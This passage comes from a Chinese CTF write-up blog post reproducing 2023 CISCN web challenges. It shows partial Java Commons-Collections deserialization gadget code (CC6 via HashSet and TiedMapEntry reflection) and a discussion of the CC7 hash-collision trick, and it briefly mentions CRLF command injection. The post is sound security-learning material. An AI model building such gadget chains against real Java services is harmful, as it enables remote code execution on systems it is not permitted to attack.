class_">TiedMapEntry</span>(outerMap, <span class="string">&quot;k&quot;</span>);</span><br><span class="line">      <span class="comment">/*Map expMap = new HashMap();</span></span><br><span class="line"><span class="comment">      expMap.put(tme, &quot;valuevalue&quot;);*/</span></span><br><span class="line">      Reflection.setFieldValue(transformer, <span class="string">&quot;iConstant&quot;</span>, expect);</span><br><span class="line"></span><br><span class="line">      <span class="comment">//CC6</span></span><br><span class="line"><span class="comment">//这里不知道为什么需要设置这些HashSet的成员变量才能成功，这段时间忙着公考，忙完再把CC链仔细研究一遍</span></span><br><span class="line">      <span class="type">HashSet</span> <span class="variable">map</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashSet</span>(<span class="number">1</span>);</span><br><span class="line">      map.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">      <span class="type">Field</span> <span class="variable">f</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">          f = HashSet.class.getDeclaredField(<span class="string">&quot;backingMap&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      f.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      <span class="type">HashMap</span> <span class="variable">innimpl</span> <span class="operator">=</span> (HashMap) f.get(map);</span><br><span class="line"></span><br><span class="line">      <span class="type">Field</span> <span class="variable">f2</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">          f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">      &#125; <span class="keyword">catch</span> (NoSuchFieldException e) &#123;</span><br><span class="line">          f2 = HashMap.class.getDeclaredField(<span class="string">&quot;elementData&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      f2.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      Object[] array = (Object[]) f2.get(innimpl);</span><br><span class="line"></span><br><span class="line">      <span class="type">Object</span> <span class="variable">node</span> <span class="operator">=</span> array[<span class="number">0</span>];</span><br><span class="line">      <span class="keyword">if</span>(node == <span class="literal">null</span>)&#123;</span><br><span class="line">          node = array[<span class="number">1</span>];</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      <span class="type">Field</span> <span class="variable">keyField</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">      <span class="keyword">try</span>&#123;</span><br><span class="line">          keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(Exception e)&#123;</span><br><span class="line">          keyField = Class.forName(<span class="string">&quot;java.util.MapEntry&quot;</span>).getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      keyField.setAccessible(<span class="literal">true</span>);</span><br><span class="line">      keyField.set(node, tme);</span><br><span class="line">......</span><br><span class="line">      ......</span><br></pre></td></tr></table></figure>



<h2 id="CC7"><a href="#CC7" class="headerlink" title="CC7"></a>CC7</h2><p>这道题目个人认为无法使用CC7进行gadget的拼凑</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (Entry&lt;?,?&gt; e = tab[index] ; e != <span class="literal">null</span> ; e = e.next) &#123;</span><br><span class="line">    <span class="keyword">if</span> ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">java</span>.io.StreamCorruptedException();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这是CC7中利用的HashSet的readObject结尾利用的方法，观察得知，需要HashSet的相邻2个成员的哈希值相同才能执行equals，原本CC7链中是这样构造的:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap2</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">// Creating two LazyMaps with colliding hashes, in order to force element comparison during readObject</span></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformerChain);</span><br><span class="line">lazyMap1.put(<span class="string">&quot;yy&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap2</span> <span class="operator">=</span> LazyMap.decorate(innerMap2, transformerChain);</span><br><span class="line">lazyMap2.put(<span class="string">&quot;zZ&quot;</span>, <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment">// Use the colliding Maps as keys in Hashtable</span></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(lazyMap2, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>可以看出，通过精心构造使得lazyMap1和lazyMap2的哈希值相同，才触发了<code>&amp;&amp;</code>后的equals方法，但是对于这道题目需要这样构造</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">......</span><br><span class="line">......</span><br><span class="line"><span class="type">Map</span> <span class="variable">innerMap1</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">HashMap</span>();</span><br><span class="line"></span><br><span class="line"><span class="type">Map</span> <span class="variable">lazyMap1</span> <span class="operator">=</span> LazyMap.decorate(innerMap1, transformer);</span><br><span class="line"></span><br><span class="line"><span class="type">Hashtable</span> <span class="variable">hashtable</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Hashtable</span>();</span><br><span class="line">hashtable.put(lazyMap1, <span class="number">1</span>);</span><br><span class="line">hashtable.put(outerMap, <span class="number">2</span>);</span><br></pre></td></tr></table></figure>

<p>由于本人水平有限或者在数学中没有方法，不知道如何让HashMap与LazyMap进行哈希碰撞，所以此题目可能无法使用CC7进行gadget generate</p>
<p>综上所属，本道题目至少有3种payload可用，其中2种为CC链拼凑，另外一种就是直接用HashMap作为入口，也就是首先提到的小绿茶实验室的WP所用的gadget</p>
<h1 id="mysql-dump"><a href="#mysql-dump" class="headerlink" title="mysql_dump"></a>mysql_dump</h1><p>这道题比较简单， 就是简单的用CR LF 逃逸然后命令拼接。当然也有其他方法。由于找不到题目源码，不复现了。</p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io">lanb0</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://wustzhb.github.io/2023/10/23/[2023CISCN]%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/">https://wustzhb.github.io/2023/10/23/[2023CISCN]%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://wustzhb.github.io" target="_blank">Lanb0's blog|一个默默无闻的网安爱好者</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/CISCN/">CISCN</a><a class="post-meta__tags" href="/tags/WEB%E5%AE%89%E5%85%A8/">WEB安全</a></div><div class="post_share"><div class="social-share" data-image="/img/head.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/10/02/%5BJAVA%E5%AE%89%E5%85%A8%5DROME%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="[JAVA安全]ROME链复现与分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">[JAVA安全]ROME链复现与分析</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/04/04/2023CTFSHOW%E6%84%9A%E4%BA%BA%E6%9D%AF%E9%83%A8%E5%88%86WP(WEB&MISC)/" title="2023CTFSHOW愚人杯WEB部分WP"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-04</div><div class="title">2023CTFSHOW愚人杯WEB部分WP</div></div></a></div><div><a href="/2023/05/16/%5B2023AliyunCTF%5DWEB%E9%A2%98%E5%A4%8D%E7%8E%B0/" title="[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-16</div><div class="title">[2023阿里云CTF]ezBean复现及相关fastjson机制深入分析</div></div></a></div><div><a href="/2023/06/09/%5B2023%E9%99%95%E8%A5%BF%E7%9C%81%E5%A4%A7%E5%AD%A6%E7%94%9F%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%5DWEB%E5%A4%8D%E7%8E%B0/" title="[2023陕西省大学生网络安全大赛]WEB复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-06-09</div><div class="title">[2023陕西省大学生网络安全大赛]WEB复现</div></div></a></div><div><a href="/2023/04/17/%5BGDOUCTF%202023%5Dweb%20WriteUp/" title="[GDOUCTF 2023]web WriteUp"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-04-17</div><div class="title">[GDOUCTF 2023]web WriteUp</div></div></a></div><div><a href="/2023/05/16/%5BGFCTF2021%5D%E6%96%87%E4%BB%B6%E6%9F%A5%E7%9C%8B%E5%99%A8%E5%A4%8D%E7%8E%B0/" title="[GFCTF2021]文件查看器复现"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-05-16</div><div class="title">[GFCTF2021]文件查看器复现</div></div></a></div><div><a href="/2023/10/02/%5BJAVA%E5%AE%89%E5%85%A8%5DROME%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="[JAVA安全]ROME链复现与分析"><div class="cover" style="background: var(--default-bg-color)"></div><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-10-02</div><div class="title">[JAVA安全]ROME链复现与分析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/head.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">lanb0</div><div class="author-info__description">充实地过好每一天</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">36</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">50</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">27</div></a></div><div class="card-info-social-icons is-center"><a class="social-icon" href="https://qm.qq.com/cgi-bin/qm/qr?k=Ga7oV2UM08biI8VudKTeFcEdzYPbbXdz&amp;noverify=0&amp;personal_qrcode_source=4" target="_blank" title="QQ"><i class="fab fa-qq"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">没什么大事要宣布的</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Unzip"><span class="toc-number">1.</span> <span class="toc-text">Unzip</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#go-session"><span class="toc-number"></span> <span class="toc-text">go_session</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#BackendService"><span class="toc-number"></span> <span class="toc-text">BackendService</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#deserbug"><span class="toc-number"></span> <span class="toc-text">deserbug</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CC5"><span class="toc-number">1.</span> <span class="toc-text">CC5</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC6"><span class="toc-number">2.</span> <span class="toc-text">CC6</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#CC7"><span class="toc-number">3.</span> <span class="toc-text">CC7</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#mysql-dump"><span class="toc-number"></span> <span class="toc-text">mysql_dump</span></a></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/23/%5B2023CISCN%5D%E5%9B%BD%E8%B5%9B%E5%88%9D%E8%B5%9BWEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="[2023CISCN]国赛初赛WEB题目复现">[2023CISCN]国赛初赛WEB题目复现</a><time datetime="2023-10-23T10:00:00.000Z" title="发表于 2023-10-23 18:00:00">2023-10-23</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/02/%5BJAVA%E5%AE%89%E5%85%A8%5DROME%E9%93%BE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="[JAVA安全]ROME链复现与分析">[JAVA安全]ROME链复现与分析</a><time datetime="2023-10-02T10:00:00.000Z" title="发表于 2023-10-02 18:00:00">2023-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/10/02/%5BJAVA%E5%AE%89%E5%85%A8%5D%E5%85%A8%E9%9D%A2%E5%AD%A6%E4%B9%A0JNDI%E6%9C%BA%E5%88%B6%E4%B8%8E%E6%B3%A8%E5%85%A5/" title="[JAVA安全]全面学习JNDI机制与注入">[JAVA安全]全面学习JNDI机制与注入</a><time datetime="2023-10-02T10:00:00.000Z" title="发表于 2023-10-02 18:00:00">2023-10-02</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/28/%5B%E5%85%8D%E6%9D%80%E5%AD%A6%E4%B9%A0%5DMSF%E6%A1%86%E6%9E%B6%E5%88%86%E6%9E%90%E4%B9%8BWindows%20Api%E8%B0%83%E7%94%A8/" title="[免杀学习]MSF框架分析之Windows Api的调用">[免杀学习]MSF框架分析之Windows Api的调用</a><time datetime="2023-09-28T12:00:00.000Z" title="发表于 2023-09-28 20:00:00">2023-09-28</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2023/09/24/%5BJS%E4%B8%93%E9%A1%B9%E8%AE%AD%E7%BB%83%5DSecure%20Portal/" title="[JS专项训练]Secure Portal">[JS专项训练]Secure Portal</a><time datetime="2023-09-23T17:06:00.000Z" title="发表于 2023-09-24 01:06:00">2023-09-24</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/index_img.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2023 By lanb0</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div><div class="footer_custom_text">欢迎来到lanb0的博客</div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><div class="js-pjax"></div><script defer="defer" id="ribbon" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-ribbon.min.js" size="150" alpha="0.6" zIndex="-1" mobile="false" data-click="false"></script></div></body></html>